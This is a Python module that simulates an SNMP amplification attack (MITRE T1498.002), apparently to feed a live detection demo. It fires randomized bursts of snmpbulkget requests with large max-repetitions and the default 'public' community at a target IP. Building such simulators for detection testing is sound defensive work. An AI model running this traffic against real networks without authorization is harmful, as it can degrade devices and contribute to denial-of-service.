"""SNMP amplification injector (MITRE T1498.002).

Issues GETBULK requests with a large max-repetitions so a small request elicits a
large response — the reflection/amplification fingerprint: high getbulk rate and
large response packets. Runs as an organic campaign (entropy-seeded waves + quiet
gaps, randomized max-repetitions) so the live demo varies every run.
"""

from __future__ import annotations

import logging
import subprocess
import threading

from ._campaign import new_rng, run_campaign

LOG = logging.getLogger("attack.snmp_amplify")


def run(server_ip: str, stop_event: threading.Event) -> None:
    rng = new_rng()

    def burst(intensity: str) -> None:
        reps = rng.choice([40, 50, 60]) if intensity == "loud" else rng.choice([20, 25])
        for _ in range(8 if intensity == "loud" else 2):
            cmd = ["snmpbulkget", "-v2c", "-c", "public", "-t", "2", "-r", "0",
                   "-Cn0", f"-Cr{reps}", "-On", server_ip, "1.3.6.1.2.1.2.2"]
            try:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                               timeout=8, check=False)
            except (subprocess.TimeoutExpired, OSError) as exc:
                LOG.debug("snmpbulkget -> %s", exc)
        stop_event.wait(rng.uniform(0.3, 1.0) if intensity == "loud" else rng.uniform(5.0, 10.0))

    LOG.warning("SNMP amplification injector active (organic campaign)")
    run_campaign(rng, stop_event, burst)
